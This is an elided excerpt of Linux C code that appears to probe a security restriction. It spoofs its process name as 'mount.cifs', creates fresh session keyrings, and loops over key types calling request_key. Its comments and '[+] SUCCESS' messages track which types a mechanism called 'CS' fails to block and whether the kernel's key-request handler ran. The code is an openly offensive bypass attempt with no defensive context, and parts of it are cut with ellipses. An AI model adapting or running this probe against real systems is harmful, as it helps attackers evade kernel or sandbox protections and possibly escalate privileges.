...
static long try_request_key(const char *desc, int method, const char *type)
{
        long ret;
        sigset_t blk, old;
        ...
        if (method == 0) {
                ...
                errno = 0;
                ret = syscall(NR_request_key, type, desc, "",
...
int main(int argc, char **argv)
{
        ...
        /* Key types to try — cifs.idmap is NOT blocked by CS */
        ...
        for (int t = 0; key_types[t]; t++) {
                prctl(PR_SET_NAME, "mount.cifs", 0, 0, 0);

                /* fresh session keyring per type */
                {
                        char name[64];
                        snprintf(name, sizeof(name), "s-%d-%d", getpid(), t);
                        syscall(NR_keyctl, (long)KEYCTL_JOIN_SESSION_KEYRING,
                                name, 0, 0, 0);
                }

                fprintf(stderr, "[type=%s] request_key pid=%d\n",
                        key_types[t], pid);
                errno = 0;
                ret = try_request_key(desc, 0, key_types[t]);
                fprintf(stderr, "    rc=%ld errno=%d (%s)\n",
                        ret, errno, strerror(errno));
                if (ret >= 0) {
                        fprintf(stderr, "[+] SUCCESS with type=%s\n",
                                key_types[t]);
                        sleep(3);
                        return 0;
                }
                if (errno == ENOKEY || errno == EINTR) {
                        fprintf(stderr, "[*] type=%s was NOT blocked (errno=%d) — handler may have run!\n",
                                key_types[t], errno);
                        fprintf(stderr, "[*] waiting 5s for handler to complete...\n");
                        sleep(5);
                        return 0;
                }
        }
